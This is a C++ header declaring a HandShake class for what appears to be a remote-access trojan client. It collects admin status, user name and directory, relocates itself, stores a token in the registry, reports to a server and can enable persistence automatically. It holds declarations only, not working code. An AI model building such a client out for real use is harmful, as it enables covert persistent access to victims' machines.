#ifndef HANDSHAKE_H
#define HANDSHAKE_H

#include "../inc/master.h"

using namespace std;

class HandShake
{
    /*
    Collects the first information unavailable to the program and manages the client's first actions.
    Sends the primary information when the client connects.
    */

    public:
        HandShake(); //Default constructor.

        //Collects information from the machine:
        BOOL setIsAdmin(); //Function to check if the user is an admin and return false or true.
        wstring setNameUser(); //Function to get the name of the user.
        wstring setCurrentDirectory(); //Function to get the current directory.
        wstring setLocationProg(); //Function to set the location of the program after it has been moved according to rights.
        VOID setSock(SOCKET sock); //Function to set the socket.

        wstring getTokenOrSetTokenInRegistry(); //Function to get the token or set the token in the registry.
        wstring generateToken(CONST INT token_size); //Function to generate a token and set it in a_token.

        //---------------------------------------------------------------------
        //Network:

        //---------------------------------------------------------------------

        VOID beforeHandShake(); //Function to manage actions before starting the handshake and set a_location_prog.
        VOID startHandShake(); //Function to send the first necessary information to the server, and if MOD_HANDSHAKE_AUTO_PERSISTENCE = True, then persistence is activated automatically.

        //---------------------------------------------------------------------

        BOOL getIsAdmin(); //Getter for is_admin.
        wstring getPathProg(); //Getter to see the location of the program.
        wstring getNameUser(); //Getter for the name of the user.
        wstring getToken(); //Getter for the token.

        //---------------------------------------------------------------------

    private:
        BOOL a_is_admin = FALSE; //Whether the user is an admin or not.
        //string a_name_prog;
        wstring a_name_user; //The name of the user.
        wstring a_current_directory; //The current directory.
        wstring a_path_prog; //The location of the program once it has been moved or not moved.
        wstring a_token; //The token.

        SOCKET a_sock; //The socket.
        CONST INT a_size_token = 24; //The size of the token.
};

#endif
